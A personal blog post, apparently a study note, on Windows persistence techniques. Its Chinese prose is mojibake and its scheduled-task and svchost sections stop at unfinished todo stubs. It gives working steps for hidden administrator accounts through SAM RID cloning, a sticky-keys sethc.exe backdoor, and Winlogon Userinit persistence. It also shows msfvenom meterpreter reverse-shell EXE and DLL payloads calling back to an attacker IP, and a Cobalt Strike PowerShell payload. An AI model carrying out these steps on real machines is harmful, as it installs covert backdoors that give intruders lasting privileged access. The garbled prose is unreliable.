---
layout: post
title: Windows æƒé™ç»´æŒ
subtitle: Windows æƒé™ç»´æŒ
date: 2024-08-05 14:44
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
published: true
---
æƒé™ç»´æŒï¼ˆPersistenceï¼‰æ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„ä¸€ä¸ªé‡è¦é˜¶æ®µï¼Œé€šå¸¸æŒ‡æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸­å»ºç«‹é•¿æœŸå­˜åœ¨çš„è®¿é—®é€šé“ï¼Œä»¥ç¡®ä¿å³ä½¿ç›®æ ‡ç³»ç»Ÿé‡å¯æˆ–æ”»å‡»è¢«éƒ¨åˆ†æ¸…é™¤åï¼Œä»èƒ½é‡æ–°è·å¾—è®¿é—®æƒé™ã€‚

## 1. ç³»ç»Ÿç”¨æˆ·éšè—

### 1.1. å‘½ä»¤è¡Œéšè—ç”¨æˆ·

é€šè¿‡å‘½ä»¤è¡Œçš„ net å‘½ä»¤æ·»åŠ å¸¦ `$` åç¼€çš„ç”¨æˆ·

```batch
net user hack$ hack /add
```

![image.png](https://img.ghostliner.top/roGcZF.png)

ä½¿ç”¨ `net user` æ— æ³•å‘ç°ç”¨æˆ·ï¼Œé€šè¿‡ç”¨æˆ·ç®¡ç†ç•Œé¢å’Œæ³¨å†Œè¡¨èƒ½æŸ¥çœ‹

![image.png](https://img.ghostliner.top/4mejBG.png)

![image.png](https://img.ghostliner.top/MysKfq.png)

### 1.2. æ³¨å†Œè¡¨å…‹éš†ç”¨æˆ·

`HKLM/SAM/SAM/Domains/Users/Names`
å¯¼å‡º `hack$` å’Œ `administrator` ç”¨æˆ·åŠå…¶å¯¹åº”çš„ RID æ³¨å†Œè¡¨é¡¹

è‹¥ SAM æ— æ³•æŸ¥çœ‹æ·»åŠ æƒé™å³å¯

![image.png](https://img.ghostliner.top/jIkKYE.png)

![image.png](https://img.ghostliner.top/2nAzSW.png)

RID ä¸º 500ï¼ˆ0x1F4ï¼‰çš„è´¦æˆ·æ˜¯ç³»ç»Ÿå†…ç½®çš„ Administrator ç®¡ç†å‘˜è´¦æˆ·ã€‚
0x3E9ï¼ˆ1001ï¼‰ï¼šæ™®é€šç”¨æˆ·è´¦æˆ·ã€‚

![image.png](https://img.ghostliner.top/vkFIBt.png)

 **æ›¿æ¢ F é”®å€¼å†…å®¹**

å°† hack çš„ 3e9 çš„ F å€¼æ›¿æ¢æˆ admin çš„ 1f4 çš„ F å€¼

![image.png](https://img.ghostliner.top/OkiPx8.png)

**åˆ é™¤ç”¨æˆ·**

```batch
net user hack$ /del
```

**å¯¼å…¥ç”¨æˆ·å’Œ RID æ³¨å†Œè¡¨**

åŒå‡»è¿è¡Œ hack å’Œ 03e9 æ³¨å†Œè¡¨æ–‡ä»¶ï¼Œè¿›è¡Œå¯¼å…¥

**ä¿®æ”¹ç”¨æˆ·ç»„**

```batch
# ä½¿æ¡Œé¢ç™»å½•ä¸æ˜¾ç¤º
net localgroup "remote desktop users" hack$ /add
```

**æŸ¥çœ‹ç”¨æˆ·**

å‘ç°é™¤æ³¨å†Œè¡¨å¤–å…¶ä»–æ— æ³•æŸ¥çœ‹åˆ° `hack$` ç”¨æˆ·

![image.png](https://img.ghostliner.top/mHKjhz.png)

## 2. Shift åé—¨

shift åé—¨æŒ‡çš„æ˜¯ Windows ç³»ç»Ÿä¸ºäº†ä¸æ–¹ä¾¿æŒ‰ç»„åˆé”®çš„äººè®¾è®¡çš„ sethc.exe ç¨‹åºï¼Œå³ Windows çš„ç²˜æ»é”®ï¼Œå½“æŒ‰ä¸‹ Shift é”®äº”æ¬¡æ—¶ï¼ŒWindows ä¼šè§¦å‘â€œç²˜æ»é”®â€åŠŸèƒ½ï¼Œè¿è¡Œ sethc.exe ã€‚æ”»å‡»è€…å¯ä»¥æ›¿æ¢ sethc.exe ä¸ºå‘½ä»¤æç¤ºç¬¦ï¼ˆ cmd.exe ï¼‰æˆ–å…¶ä»–æ¶æ„ç¨‹åºï¼Œä»è€Œåœ¨é”å±ç•Œé¢è·å¾—æœªæˆæƒçš„å‘½ä»¤è¡Œè®¿é—®ã€‚æ­¤ç¨‹åºæ˜¯èƒ½ç›´æ¥ä»¥ System æƒé™æ‰§è¡Œå‘½ä»¤çš„ã€‚

### 2.1. è·å–æ§åˆ¶æƒé™

åœ¨ Windows æ“ä½œç³»ç»Ÿä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`sethc.exe` çš„æ‰€æœ‰è€…æ˜¯ `TrustedInstaller`ã€‚
`TrustedInstaller` æ˜¯ Windows æ¨¡å—å®‰è£…ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œè´Ÿè´£ç®¡ç†å’Œä¿æŠ¤æ“ä½œç³»ç»Ÿæ–‡ä»¶çš„æƒé™ï¼Œç¡®ä¿åªæœ‰ç»è¿‡æˆæƒçš„ç”¨æˆ·æˆ–è¿›ç¨‹èƒ½å¤Ÿä¿®æ”¹å®ƒã€‚

```batch
icacls C:\Windows\System32\sethc.exe
# (F)  å®Œå…¨æ§åˆ¶æƒé™
# (RX) è¯»å–å’Œæ‰§è¡Œæƒé™
```

![image.png](https://img.ghostliner.top/P9pAaY.png)

æ›¿æ¢å½“å‰ç”¨æˆ·ä¸ºæ‰€æœ‰è€…

```batch
takeown /f C:\Windows\System32\sethc.exe
# ç®¡ç†å‘˜ç»„è·å–æ‰€æœ‰æƒ
takeown /f C:\Windows\System32\sethc.exe /a
```

![image.png](https://img.ghostliner.top/PRuB6V.png)

ç»™ä¸å½“å‰ç”¨æˆ·å®Œå…¨æ§åˆ¶æƒé™

```batch
# ç»™äºˆldç”¨æˆ·ç»™ä¸å®Œå…¨æ§åˆ¶æƒé™
icacls C:\Windows\System32\sethc.exe /grant ld:F
```

![image.png](https://img.ghostliner.top/uWt0Cr.png)

**ä½¿ç”¨ cmd.exe æ›¿æ¢ sethc.exe**

```batch
move sethc.exe sethc_bk.exe
copy cmd.exe sethc.exe
```

**éªŒè¯**

æ³¨é”€ç”¨æˆ·ï¼Œåœ¨ç³»ç»Ÿæœªç™»å½•æ—¶æŒ‰ä¸‹ 5 æ¬¡ Shift é”®ï¼Œè¿è¡Œ sethc.exeï¼Œè·å– system æƒé™

![image.png](https://img.ghostliner.top/cTPNcp.png)

## 3. å¯åŠ¨é¡¹

### 3.1. å¯åŠ¨æ–‡ä»¶å¤¹

**å¯åŠ¨æ–‡ä»¶å¤¹ï¼ˆStartup Folderï¼‰**ï¼šæ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªé‡è¦ç›®å½•ï¼Œä¸“é—¨ç”¨äºå­˜æ”¾ç”¨æˆ·å¸Œæœ›åœ¨ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨çš„ç¨‹åºå¿«æ·æ–¹å¼ã€‚å…¶ä½œç”¨æ˜¯é€šè¿‡æ”¾ç½®å¿«æ·æ–¹å¼ï¼Œä½¿å¾—ç›¸å…³åº”ç”¨ç¨‹åºæˆ–è„šæœ¬åœ¨ç”¨æˆ·æ¯æ¬¡å¯åŠ¨ç³»ç»Ÿæˆ–ç™»å½•æ—¶è‡ªåŠ¨è¿è¡Œï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„ä¾¿åˆ©æ€§å’Œæ•ˆç‡ã€‚

æ–‡ä»¶å¤¹ä½ç½®ï¼š

```batch
#=========win7-win10=========== 
C:\Users\<ç”¨æˆ·å>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup #å½“å‰ç”¨æˆ· 
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #æ‰€æœ‰ç”¨æˆ· #==============xp============== 
C:\Documents and Settings\<ç”¨æˆ·å>\Start Menu\Programs\Startup #å½“å‰ç”¨æˆ· 
C:\Documents and Settings\All Users\Start Menu\Programs\Startup #æ‰€æœ‰ç”¨æˆ·
```

å¯ä»¥é€šè¿‡ `Win+R` å¿«é€Ÿè¿›å…¥å¯åŠ¨æ–‡ä»¶å¤¹ï¼š
- `shell:startup`: æ‰“å¼€å½“å‰ç”¨æˆ·çš„å¯åŠ¨æ–‡ä»¶å¤¹
- `shell:common startup`: æ‰“å¼€æ‰€æœ‰ç”¨æˆ·çš„å¯åŠ¨æ–‡ä»¶å¤¹

### 3.2. Winlogon Helper

Winlogon æ˜¯ Windows ç³»ç»Ÿçš„ç»„ä»¶ï¼Œç”¨äºå¤„ç†ä¸ç”¨æˆ·æœ‰å…³çš„å„ç§è¡Œä¸ºï¼Œå¦‚ç™»å½•ã€æ³¨é”€ã€åœ¨ç™»å½•æ—¶åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶ã€é”å®šå±å¹•ç­‰ã€‚è¿™äº›è¡Œä¸ºç”±ç³»ç»Ÿæ³¨å†Œè¡¨ç®¡ç†ï¼Œæ³¨å†Œè¡¨ä¸­çš„ä¸€äº›é”®å€¼å®šä¹‰äº†åœ¨ Windows ç™»å½•æœŸé—´ä¼šå¯åŠ¨å“ªäº›è¿›ç¨‹ã€‚

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`ï¼šæ§åˆ¶ç€åœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œçš„åˆå§‹åŒ–ç¨‹åºã€‚è¯¥æ³¨å†Œè¡¨é¡¹æŒ‡å®šäº†ç”¨æˆ·ç™»å½•åï¼Œç³»ç»Ÿåº”å½“å¯åŠ¨çš„åˆå§‹åŒ–ç¨‹åºï¼Œé€šå¸¸æ˜¯ `userinit.exe`

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell`ï¼šç”¨æˆ·ç™»å½•åè¦å¯åŠ¨çš„å¤–å£³ç¨‹åºï¼ˆé€šå¸¸æ˜¯æ¡Œé¢ç¯å¢ƒï¼‰ã€‚è¯¥é¡¹å†³å®šäº† Windows å¯åŠ¨æ—¶åŠ è½½çš„ä¸»ç”¨æˆ·ç•Œé¢è¿›ç¨‹ï¼Œé€šå¸¸æ˜¯ `explorer.exe`

![image.png](https://img.ghostliner.top/yzjvwW.png)

#### 3.2.1. ä¿®æ”¹ Userinit å°¾éšå¯åŠ¨

```batch
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\system32\userinit.exe,c:\soft\mm32.exe" /f
```

![image.png](https://img.ghostliner.top/ZWPqXg.png)

msfç”Ÿæˆæœ¨é©¬

```shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.163.132 lport=4444 -f exe -o mm32.exe
```

æ³¨é”€é‡æ–°ç™»å½•ï¼Œmsf ç›‘å¬æˆåŠŸ

#### 3.2.2. Userinit æ— è½åœ°æ–‡ä»¶ cs ä¸Šçº¿

cs ç”Ÿæˆ powershell payload

![image.png](https://img.ghostliner.top/edc111.png)

ç”Ÿæˆçš„ Payload
![image.png](https://img.ghostliner.top/mHjcRX.png)

å°†å…¶å¤åˆ¶ç²˜è´´åˆ° Userinit ä¸­

![image.png](https://img.ghostliner.top/kaeGzV.png)

æ³¨é”€åç™»å½•ï¼Œcs ä¸Šçº¿æˆåŠŸ

### 3.3. ç»„ç­–ç•¥è„šæœ¬å¯åŠ¨æ–‡ä»¶å¤¹

ç»„ç­–ç•¥è„šæœ¬å­˜æ”¾ä½ç½®
- è®¡ç®—æœºå¯åŠ¨è„šæœ¬ç›®å½•ï¼š`C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup`
- è®¡ç®—æœºå…³æœºè„šæœ¬ç›®å½•ï¼š`C:\Windows\System32\GroupPolicy\Machine\Scripts\Shutdown`
- ç”¨æˆ·ç™»å½•è„šæœ¬ç›®å½•ï¼š`C:\Windows\System32\GroupPolicy\User\Scripts\Logon`
- ç”¨æˆ·æ³¨é”€è„šæœ¬ç›®å½•ï¼š`C:\Windows\System32\GroupPolicy\User\Scripts\Logoff`

![image.png](https://img.ghostliner.top/qu2N25.png)

**è„šæœ¬æ”¯æŒç±»å‹**ï¼š`bat`ã€`ps1`ã€`cmd` ç­‰

### 3.4. è®¡åˆ’ä»»åŠ¡

å·¥å…·ï¼š
- `at`: ç”¨äºåˆ›å»ºç®€å•çš„ä¸€æ¬¡æ€§ä»»åŠ¡ï¼Œå·²è¿‡æ—¶
- `schtasks`: ç”¨äºåˆ›å»ºå¤æ‚çš„å‘¨æœŸæ€§ä»»åŠ¡

#### 3.4.1. at

```batch
# åˆ›å»ºè®¡åˆ’ä»»åŠ¡ 
at 14:30 "notepad.exe"
# åˆ é™¤è®¡åˆ’ä»»åŠ¡
at ID /delete
```

#### 3.4.2. schtasks

**åˆ›å»ºä»»åŠ¡(/create)**

- [ ] todoğŸ“… 2025-08-06 
**æŸ¥è¯¢ä»»åŠ¡(/query)**

**åˆ é™¤ä»»åŠ¡(/delete)**

**ä¿®æ”¹ä»»åŠ¡(/change)**

**è¿è¡Œä»»åŠ¡(/run)**

**åœæ­¢ä»»åŠ¡(/end)**

**è®¡åˆ’ç±»å‹(/sc)**


| ç±»å‹      | æè¿°        | å®ä¾‹  |
| ------- | --------- | --- |
| once    | ä¸€æ¬¡æ€§ä»»åŠ¡     |     |
| daily   | æ¯å¤©æ‰§è¡Œä»»åŠ¡    |     |
| weekly  | æ¯å‘¨æ‰§è¡Œä»»åŠ¡    |     |
| monthly | æ¯æœˆæ‰§è¡Œä»»åŠ¡    |     |
| onstart | ç³»ç»Ÿå¯åŠ¨æ—¶æ‰§è¡Œä»»åŠ¡ |     |
| onlogon | ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œä»»åŠ¡ |     |
| onidle  | ç³»ç»Ÿç©ºé—²æ—¶æ‰§è¡Œä»»åŠ¡ |     |

### 3.5. svhost å®¿ä¸»æœåŠ¡åŠ è½½ dll

`svchost.exe`æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªå…³é”®ç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºæ‰˜ç®¡å’Œè¿è¡Œ Windows ç³»ç»Ÿä¸­çš„å¤šä¸ªæœåŠ¡ã€‚å®ƒé€šè¿‡åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰æ–‡ä»¶æ¥æ‰§è¡ŒæœåŠ¡ä»»åŠ¡ï¼Œè€Œä¸æ˜¯ç›´æ¥ä»å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆEXEï¼‰è¿è¡ŒæœåŠ¡ã€‚
`svchost.exe` é€šè¿‡å°†æœåŠ¡æ³¨å†Œåˆ°ç³»ç»Ÿä¸­ï¼Œå¹¶æ ¹æ®æ³¨å†Œè¡¨é…ç½®åŠ è½½å¯¹åº”çš„ DLL æ–‡ä»¶ï¼Œä»è€Œå¯åŠ¨å’Œç®¡ç†å„ä¸ªæœåŠ¡ã€‚

æœåŠ¡æ³¨å†Œè¡¨è·¯å¾„ï¼š`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>`

#### 3.5.1. æ¼æ´åˆ©ç”¨

##### 3.5.1.1. msf ç”Ÿæˆ dll æœ¨é©¬

```batch
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.132 LPORT=4444 -f dll > mm.dll
```

å°†ç”Ÿæˆçš„ mm.dll å¤åˆ¶åˆ°ç›®æ ‡ç³»ç»Ÿ

- [ ] todoğŸ“… 2025-08-06 
